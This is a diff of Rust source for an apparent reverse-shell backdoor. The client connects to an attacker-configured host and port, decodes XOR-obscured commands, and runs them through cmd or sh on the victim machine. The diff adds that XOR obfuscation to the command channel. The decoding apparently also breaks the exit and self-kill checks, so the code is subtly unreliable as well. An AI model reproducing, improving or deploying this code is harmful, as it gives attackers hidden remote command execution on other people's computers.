@@ -5,11 +5,18 @@ use std::process::Command;
 use std::time::Duration;
 use std::thread;
 
-/*
-fn spawn_shell() {
-	let mut child = Command::new("sh").spawn().unwrap();
-	child.wait();
-}*/
+fn int_xor(clear_text: &str, key: u8) -> String{
+	let mut enc_text = "".to_string();
+	for chr in clear_text.chars() {
+		if chr.to_string() == "\n" {
+			break;
+		}
+		let tmp = chr as u8 ^ key;
+		let chr = tmp as char;
+		enc_text = enc_text + &chr.to_string();
+	}
+	return enc_text;
+}
 
 fn main() {
 	let addr = "127.0.0.1:8888"; // Attacker host and port. EDIT here
@@ -24,16 +31,14 @@ fn main() {
 							/* Remove Null byte in command (Error while running commands*/
 							/* https://stackoverflow.com/a/49406848 */
 							command = command.trim_matches(char::from(0));
+							let tmp = int_xor(command, 16);
+							command = &*tmp;
 							if command == "exit\n" {
 								break;
 							}
 							else if command == "killself\n" {
 								return;
-							} /*
-							else if command == "spawn_shell\n"{
-								/* Unusable */
-								spawn_shell();
-							}*/
+							}
 							else {
 								let output = if cfg!(target_os = "windows") {
 									Command::new("cmd").args(&["/C", command]).output().unwrap()
